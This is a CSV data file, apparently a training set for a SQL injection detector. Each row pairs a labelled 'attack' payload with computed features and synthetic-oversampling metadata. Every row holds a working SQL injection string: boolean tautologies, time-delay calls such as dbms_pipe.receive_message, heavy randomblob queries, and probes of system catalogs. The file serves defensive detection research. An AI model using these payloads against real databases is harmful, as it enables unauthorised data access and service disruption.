id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000431,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000142,1.4821836323723798,165.0,37.37670963188932,4.124763608950277,67.0,18.0,57.0,23.0,0.40606060606060607,0.10909090909090909,0.34545454545454546,0.1393939393939394,6.4931614724427265,1.5068385275572733,1.0,-1.3877787807814457e-17,0.0,1.0,0.0,8.0,0.0,0.0,0.0,6.0,1.0,0.3767096318893184,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000432,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000117,0.5616681740462405,69.12301142926742,24.288441071646066,3.708426245741666,14.80381750030449,21.030752857316852,24.515376428658428,8.77306464298764,0.2120890767216174,0.3047556898651942,0.35679908709598857,0.12635614631719988,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.257688214329213,0.0,0.2576882143292132,0.2576882143292132,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000433,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000025,0.05210997864909993,136.97523994176677,32.0,4.217761304644614,69.0,16.0,37.0,14.975239941766764,0.5037413291121776,0.11680958356224408,0.27012216198768946,0.10932692533788888,0.975239941766765,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,0.0,0.0,2.0,5.0,0.975239941766765,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000434,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000046,1.093908167545642,130.3975449472788,37.1649246424466,3.8959156716315495,40.11631015241609,20.902771019938974,51.902771019938974,17.475692754984742,0.306871185234705,0.1590505828323472,0.3993561343969236,0.13472209753602424,2.0,0.7378463774923716,2.0,1.0,0.0,1.7378463774923716,0.0,9.0,0.0,0.0,1.0,4.737846377492372,1.0,0.7378463774923718,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7378463774923717,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7378463774923718
SMOTE_000435,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000086,1.4724300741112892,120.07979253380459,27.943972337840613,3.5010080000074173,35.719861689203064,13.735993084460153,51.67996542230077,18.943972337840613,0.29232069533896715,0.11552056914362527,0.43405664618645207,0.15810208933095554,0.0,3.264006915539847,0.0,-1.3877787807814457e-17,0.0,1.2640069155398468,0.0,10.20797925338046,0.7359930844601532,1.0,2.4719861689203064,1.2640069155398468,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2640069155398468,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7359930844601532,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000436,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000031,0.6582757573019781,159.12391924011152,33.76780567810055,4.096075003069368,79.21366813720658,16.0,47.142445424804386,16.767805678100547,0.4975643952248309,0.10088765530266997,0.29597855223019165,0.10556939724230743,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.767805678100548,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.2321943218994521,0.7678056781005479,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000437,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000057,0.44253973858433016,137.47893636836102,34.07982272806017,4.282230919900874,63.521063631638974,15.63858182448137,39.31929091224069,19.0,0.46223948700727036,0.11358795694086736,0.2859509130014238,0.1382216430504385,4.079822728060171,3.680709087759314,0.15964545612034253,-1.3877787807814457e-17,0.0,2.0,0.0,4.079822728060171,0.0,0.0,0.0,6.159645456120343,1.0,0.9201772719398287,0.07982272806017127,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.07982272806017135,1.0,1.9201772719398287,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000438,attack,boolean,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,nearest_attack_euclidean,R000065,0.03931310315361912,133.97196229984885,27.990654099949616,4.015782947783686,66.04672950025191,9.953270499748086,36.0,21.97196229984885,0.49299944407221896,0.07428612418638228,0.268714216543548,0.1640002151978507,0.0,3.9906540999496167,0.0,-1.3877787807814457e-17,1.0,1.990654099949617,0.0,4.009345900050383,1.981308199899234,5.0,4.0,2.9906540999496167,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.990654099949617,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9906540999496167
SMOTE_000439,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000119,0.41588770738372155,130.8269999964792,34.33258823487991,3.858272820808518,38.247205880799655,15.665176469759816,50.58202941103984,26.332588234879907,0.29171698268097146,0.11924853338069387,0.38740112677416755,0.20163335716416708,1.166294117439954,0.0,2.0,-1.3877787807814457e-17,0.0,1.083147058719977,0.0,11.0,0.916852941280023,2.0,1.0,9.24944117615993,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.08314705871997685,0.0,0.08314705871997696,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1662941174399537
SMOTE_000440,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000016,0.017486875124674513,161.93297620158168,37.98212698708845,4.043771802862353,51.95084921449324,23.004468253227888,56.995531746772116,29.982126987088453,0.32079964769739044,0.14207043774193914,0.35198188038493855,0.18514803417573183,2.991063493544225,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.0,0.0,2.0,1.0,11.991063493544225,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9955317467721126,0.0,1.0,0.0,0.9955317467721126,0.004468253227887353,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9955317467721128
SMOTE_000441,attack,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",nearest_attack_euclidean,R000058,2.1548955031600574,155.49721558518866,32.55347198518531,4.034470290432302,81.98124786666779,8.893056029629381,45.6229116888915,19.0,0.5289153529453215,0.05825066701939738,0.28963870350971066,0.12319527652557037,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.213887940741238,0.0,2.232640074073452,2.893056029629381,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000442,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,0.24436219537035656,134.19388998206077,33.29083497309117,3.710346930444897,43.0,15.387779964121561,55.90305500896961,19.90305500896961,0.3204446642208191,0.11459302214262262,0.4166207837014127,0.14834152993514557,2.0,3.854582513454414,0.09694499103039056,1.0,0.0,2.0,0.0,9.951527504484805,0.0,0.0,1.0,3.096944991030391,1.0,1.0,0.04847249551519517,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.048472495515195335,0.0,1.9515275044848046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000443,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000076,0.6305897633343683,81.39128893156055,21.415014156931107,3.1270236454697997,11.830028313862215,15.415014156931106,40.0,14.146246460767223,0.14387643807568215,0.1889534056426227,0.4926955225464489,0.1744746337352463,0.0,4.0,1.0,-1.3877787807814457e-17,0.8537535392327764,2.0,0.0,6.0,0.292492921534447,0.0,0.0,3.8537535392327764,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000444,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,0.177961286235016,73.50350205113786,26.0,3.8180415134087906,14.431573186689594,24.0,24.14385772889653,10.928071135551736,0.19596846128637166,0.3266979367761458,0.3284961583873524,0.14883744355013015,0.0,0.9280711355517344,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,0.9280711355517344,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000445,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,0.34745039415138584,75.8611665269392,26.715291631734804,3.8254461960378383,16.145874895204404,24.0,24.715291631734804,11.0,0.2114988222514414,0.3171540678764517,0.3259848287620665,0.14536228111004035,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000446,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000052,0.8295727754867973,135.45698898285974,32.4536291314276,3.7330765853311694,39.00335985143214,15.182123622857468,55.27150550857013,26.0,0.2873944517409132,0.11207429738911102,0.40849224065105383,0.19203901021892195,0.0,1.5463708685724016,1.6357527542850654,-1.3877787807814457e-17,0.0,1.1821236228574672,0.0,11.635752754285065,0.0,2.0,1.0,8.817876377142532,0.0,1.0,0.8178763771425328,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1821236228574672,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1821236228574672
SMOTE_000447,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000100,0.9073823739324254,78.26690646747133,27.665467662643394,3.781196425957991,22.131654727700752,14.932374130114715,29.202877609655857,12.0,0.28300280972757985,0.1909209150713091,0.37274990025947785,0.15332637494163326,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,1.0,0.0,4.533812934942643,0.0,0.7330935325286786,0.7330935325286787,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000448,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000017,0.636583653225578,74.85070653969788,19.153520961450155,2.964379113983326,5.614083845800607,15.539437115649545,38.15774846259818,15.539437115649545,0.07689773725585591,0.20757067682330427,0.5079609090975354,0.20757067682330427,0.0,4.0,0.8464790385498481,-1.3877787807814457e-17,0.8464790385498481,2.0,0.0,5.692958077099696,2.0,0.0,0.15352096145015182,3.6929580770996964,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1535209614501518,0.846479038549848,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000449,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000149,1.7583720030717707,153.73949861494447,35.79719963065186,3.921678158578858,45.94229898429261,23.550700092337035,56.44929990766296,27.79719963065186,0.29781634784069416,0.15369971222032738,0.3678775159145698,0.18060642402440863,1.8985998153259296,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.89859981532593,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.4492999076629648,0.0,1.0,0.0,0.4492999076629648,0.5507000923370352,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4492999076629647
SMOTE_000450,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.6686776220472452,146.3423612851434,30.83423612851434,4.207654277744203,80.8396528996004,8.834236128514341,38.66847225702868,18.0,0.5523009696317616,0.06034007517889893,0.26427642988247413,0.12308252530686539,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,0.3315277429713185,0.0,2.834236128514341,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.1657638714856593,0.8342361285143406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000451,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000153,2.1759594353087857,158.19109876458185,35.0,4.0515671528580866,56.312100137268686,24.687899862731314,56.50319890185052,20.687899862731314,0.3594219083210068,0.15639549192863825,0.3532595720315757,0.13092302771877923,4.437366712422895,0.0,1.437366712422895,-1.3877787807814457e-17,0.0,2.0,0.0,7.813166437885525,0.0,0.0,0.0,7.437366712422895,1.0,0.0,0.43736671242289504,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.43736671242289504,1.0,1.0,0.562633287577105,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000452,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,1.9422453570535112,140.42040153940005,32.541399890042854,3.590642032261235,43.0,15.0,61.503201319485754,20.917200219914292,0.3069747243750402,0.10708420617733962,0.4369648290946293,0.14897624035299084,3.8344004398285865,2.1655995601714144,0.0,1.0,0.0,2.0,0.0,10.917200219914292,0.0,0.0,1.0,3.0,1.0,0.5413998900428534,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000453,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,0.64750316721913,76.7741840690116,17.18278937934106,2.819421007185988,12.264510441406955,11.019347255209276,40.49032637239536,13.0,0.15823512851701094,0.14127368275909327,0.5305816227689,0.16990956595499576,3.6731157517364252,0.32688424826357476,0.9182789379341063,-1.3877787807814457e-17,0.0,1.9182789379341063,0.0,6.163442124131787,0.0,0.0,0.0,2.8365578758682126,0.9182789379341063,0.08172106206589369,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9182789379341064,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9182789379341063
SMOTE_000454,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000025,0.20154984176434984,139.21359891674138,32.39063510295436,4.229705098703809,69.91148190689351,16.130211700984788,37.78127020590872,15.390635102954361,0.5023288793245453,0.11595513415333461,0.2712641415437512,0.11045184497836888,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.130211700984787,0.0,0.0,2.1302117009847867,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000455,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,0.2680451620936823,125.76119324344573,30.190298310861433,4.064761823641343,71.38059662172287,8.095149155430718,31.28544746629215,15.0,0.5676108184920728,0.06434911870564053,0.24872685369862862,0.11931320910365797,0.904850844569283,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.0,0.9048508445692831,0.0,2.095149155430717,4.0,0.9048508445692831,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000456,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000038,1.1516342453322803,75.29936724385027,27.199578162566844,3.843581911101895,20.39915632513369,16.0,26.90021091871658,12.0,0.2692217556104026,0.21282231554458614,0.3583391921865716,0.15961673665843962,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.4501054593582892,0.0,4.0,0.0,0.5498945406417108,1.0,2.450105459358289,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000457,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.5264232801493407,160.79302495458012,32.0,4.044139030844921,73.79302495458013,18.0,48.0,21.0,0.4589283063295214,0.1119458676559611,0.29852231374922955,0.13060351226528794,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.7930249545801342,0.20697504541986578,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000458,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000135,0.20603905880076948,142.0,32.988753103254076,3.895502935066939,41.0,24.0,52.0,25.0,0.2887323943661972,0.16901408450704225,0.36619718309859156,0.176056338028169,0.0,1.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000459,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000142,1.5300453678643544,159.1205397594237,37.244977510024015,4.183423829348653,64.55022489975987,19.959820080192102,52.59040481956777,22.02008995990395,0.4056183513681062,0.12753924769233055,0.3285856878977662,0.13825671304179699,7.020089959903948,0.2449775100240128,1.4899550200480256,-1.3877787807814457e-17,0.0,1.2449775100240128,0.0,7.020089959903949,0.0,0.0,0.0,6.734932530072038,1.0,0.24497751002401275,0.2449775100240127,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.24497751002401286,1.0,0.7550224899759872,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
